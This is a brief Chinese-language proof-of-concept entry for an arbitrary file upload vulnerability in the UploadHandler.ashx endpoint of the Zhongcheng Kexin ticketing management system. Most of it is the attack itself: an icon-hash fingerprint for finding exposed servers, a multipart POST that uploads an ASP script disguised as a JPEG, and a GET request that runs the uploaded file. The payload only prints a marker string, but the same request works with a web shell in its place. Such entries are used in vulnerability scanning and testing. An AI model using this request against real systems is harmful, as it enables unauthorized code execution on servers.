# 中成科信票务管理系统UploadHandler.ashx任意文件上传漏洞

- **系统**：中成科信票务管理系统UploadHandler.ashx　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`icon_hash="1632964065"`
- **请求**：`POST /WeChat/ashx/UploadHandler.ashx HTTP/1.1`
- **关键头**：`Content-Length: 210`　`Content-Type: multipart/form-data; boundary=----v0rgrenc6exzqmjdymsoe68ill…`

**请求体 / payload**
```
------v0rgrenc6exzqmjdymsoe68illorksy8
Content-Disposition: form-data; name="file"; filename="rqegpq.asp"
Content-Type: image/jpeg
<% Response.Write("tdhp3nkd") %>
------v0rgrenc6exzqmjdymsoe68illorksy8--
GET /UploadImage/rqegpq.asp HTTP/1.1
Host:
```
- **预期**：200　|　—